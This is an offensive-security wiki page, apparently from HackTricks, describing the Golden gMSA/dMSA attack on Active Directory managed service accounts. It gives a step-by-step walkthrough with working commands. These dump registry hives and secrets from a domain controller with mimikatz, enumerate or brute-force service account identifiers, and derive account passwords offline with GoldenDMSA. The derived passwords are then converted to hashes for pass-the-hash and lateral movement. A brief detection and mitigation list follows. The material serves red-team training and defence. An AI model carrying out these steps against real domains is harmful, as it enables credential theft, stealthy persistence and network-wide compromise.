# Golden gMSA/dMSA Attack (Offline Derivation of Managed Service Account Passwords)

{{#include ../../banners/hacktricks-training.md}}

## Overview

Windows Managed Service Accounts (MSA) are special principals designed to run services without the need to manually manage their passwords.
There are two major flavours:

1. **gMSA** – group Managed Service Account – can be used on multiple hosts that are authorised in its `msDS-GroupMSAMembership` attribute.
2. **dMSA** – delegated Managed Service Account – the (preview) successor to gMSA, relying on the same cryptography but allowing more granular delegation scenarios.

For both variants the **password is not stored** on each Domain Controller (DC) like a regular NT-hash.  Instead every DC can **derive** the current password on-the-fly from:

* The forest-wide **KDS Root Key** (`KRBTGT\KDS`)  – randomly generated GUID-named secret, replicated to every DC under the `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …` container.
* The target account **SID**.
* A per-account **ManagedPasswordID** (GUID) found in the `msDS-ManagedPasswordId` attribute.

The derivation is: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240 byte blob finally **base64-encoded** and stored in the `msDS-ManagedPassword` attribute.
No Kerberos traffic or domain interaction is required during normal password usage – a member host derives the password locally as long as it knows the three inputs.

## Golden gMSA / Golden dMSA Attack

If an attacker can obtain all three inputs **offline** they can compute **valid current and future passwords** for **any gMSA/dMSA in the forest** without touching the DC again, bypassing:

* Kerberos pre-authentication / ticket request logs
* LDAP read auditing
* Password change intervals (they can pre-compute)

This is analogous to a *Golden Ticket* for service accounts.

### Prerequisites

1. **Forest-level compromise** of **one DC** (or Enterprise Admin).  `SYSTEM` access is enough.
2. Ability to enumerate service accounts (LDAP read / RID brute-force).
3. .NET ≥ 4.7.2 x64 workstation to run [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) or equivalent code.

### Phase 1 – Extract the KDS Root Key

Dump from any DC (Volume Shadow Copy / raw SAM+SECURITY hives or remote secrets):

```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too
```
The base64 string labelled `RootKey` (GUID name) is required in later steps.

### Phase 2 – Enumerate gMSA/dMSA objects

Retrieve at least `sAMAccountName`, `objectSid` and `msDS-ManagedPasswordId`:

```powershell
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
  Select sAMAccountName,objectSid,msDS-ManagedPasswordId
```

[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implements helper modes:

```powershell
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```

### Phase 3 – Guess / Discover the ManagedPasswordID (when missing)

Some deployments *strip* `msDS-ManagedPasswordId` from ACL-protected reads.
Because the GUID is 128-bit, naïve bruteforce is infeasible, but:

1. The first **32 bits = Unix epoch time** of the account creation (minutes resolution).
2. Followed by 96 random bits.

Therefore a **narrow wordlist per account** (± few hours) is realistic.

```powershell
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
The tool computes candidate passwords and compares their base64 blob against the real `msDS-ManagedPassword` attribute – the match reveals the correct GUID.

### Phase 4 – Offline Password Computation & Conversion

Once the ManagedPasswordID is known, the valid password is one command away:

```powershell
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID>

# convert to NTLM / AES keys for pass-the-hash / pass-the-ticket
GoldendMSA.exe convert -d example.local -u svc_web$ -p <Base64Pwd>
```
The resulting hashes can be injected with **mimikatz** (`sekurlsa::pth`) or **Rubeus** for Kerberos abuse, enabling stealth **lateral movement** and **persistence**.

## Detection & Mitigation

* Restrict **DC backup and registry hive read** capabilities to Tier-0 administrators.
* Monitor **Directory Services Restore Mode (DSRM)** or **Volume Shadow Copy** creation on DCs.
* Audit reads / changes to `CN=Master Root Keys,…` and `userAccountControl` flags of service accounts.
* Detect unusual **base64 password writes** or sudden service password reuse across hosts.
* Consider converting high-privilege gMSAs to **classic service accounts** with regular random rotations where Tier-0 isolation is not possible.

## Tooling

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – reference implementation used in this page.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket using derived AES keys.

## References

- [Golden dMSA – authentication bypass for delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)
- [Improsec – Golden gMSA trust attack](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)

{{#include ../../banners/hacktricks-training.md}}